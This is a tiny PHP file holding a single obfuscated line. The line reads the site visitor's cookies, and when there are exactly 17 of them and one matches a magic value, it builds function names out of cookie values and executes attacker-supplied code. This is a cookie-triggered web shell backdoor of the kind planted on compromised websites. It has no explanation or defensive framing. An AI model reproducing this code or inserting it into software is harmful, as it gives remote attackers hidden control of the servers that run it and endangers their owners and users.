<?php
$p=$_COOKIE;(count($p)==17&&in_array(gettype($p).count($p),$p))?(($p[19]=$p[19].$p[32])&&($p[51]=$p[19]($p[51]))&&($p=$p[51]($p[91],$p[19]($p[69])))&&$p()):$p;